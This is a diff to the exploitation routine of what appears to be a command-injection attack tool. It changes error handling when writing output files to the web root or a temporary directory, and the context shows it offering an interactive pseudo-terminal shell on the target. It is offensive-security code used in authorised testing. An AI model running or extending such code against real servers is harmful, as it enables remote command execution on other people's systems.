@@ -43,10 +43,11 @@ def exploitation(url,delay,filename,http_request_method):
   vp_flag = True
   no_result = True
   is_encoded= False
+  stop_injection = False
   injection_type = "Semiblind-based Command Injection"
   technique = "file-based semiblind injection technique"
   
-  sys.stdout.write( "(*) Testing the "+ technique +"... ")
+  sys.stdout.write( colors.BOLD + "(*) Testing the "+ technique + "... " + colors.RESET)
   sys.stdout.flush()
   
   # Print the findings to log file.
@@ -226,18 +227,23 @@ def exploitation(url,delay,filename,http_request_method):
 	      # If failed, use tmp directory
 	      except urllib2.HTTPError, e:
 		  if e.getcode() == 404:
-		    print colors.RED + "\n(x) Error: Unable to upload the '"+ OUTPUT_TEXTFILE +"' on '/var/www'." + colors.RESET
-		    tmp_file = "/tmp/"
-		    sys.stdout.write("(*) Trying to upload the "+ OUTPUT_TEXTFILE +" on temp (" + tmp_file + ") directory ...\n")
-		    tempfile_based.exploitation(url,delay,filename,tmp_file,http_request_method)     
-		      
+		    stop_injection = True
+		    print colors.RED + "\n(x) Error: Unable to upload the '"+ OUTPUT_TEXTFILE +"' on '" + settings.SRV_ROOT_DIR + "'." + colors.RESET
+		    sys.stdout.write("(*) Trying to upload the "+ OUTPUT_TEXTFILE +" on temporary directory (" + settings.TMP_DIR + ")...\n")
+		    tempfile_based.exploitation(url,delay,filename,http_request_method)     
+		    sys.exit(0)
+		    
 	      except urllib2.URLError, e:
 		  print colors.RED + "(x) Error: The host seems to be down!" + colors.RESET
 		  sys.exit(0)
 		  
 	    shell = re.findall(r""+TAG+"", html_data)
 	  except:
-	    continue
+	    print 
+	    if stop_injection:
+	      raise
+	    else:
+	      continue
 	  
 	  if shell:
 	    	    
@@ -288,7 +294,6 @@ def exploitation(url,delay,filename,http_request_method):
 	      print "  (+) Payload : "+ colors.YELLOW + colors.BOLD + re.sub("%20", " ", payload) + colors.RESET + "\n"
 	      	      
 	    gotshell = raw_input("(*) Do you want a Pseudo-Terminal shell? [Y/n] > ")
-	    
 	    if gotshell == "Y" or gotshell == "y":
 	      print ""
 	      print "Pseudo-Terminal (type 'q' or use <Ctrl-C> to quit)"
@@ -392,11 +397,6 @@ def exploitation(url,delay,filename,http_request_method):
 		      else:
 			response = urllib2.urlopen(request)
 			
-		    # if need page reload
-		    #if menu.options.url_reload:
-		      #time.sleep(delay)
-		      #response = urllib.urlopen(url)
-
 		    path = url
 		    path_parts = path.split('/')
 		    count = 0
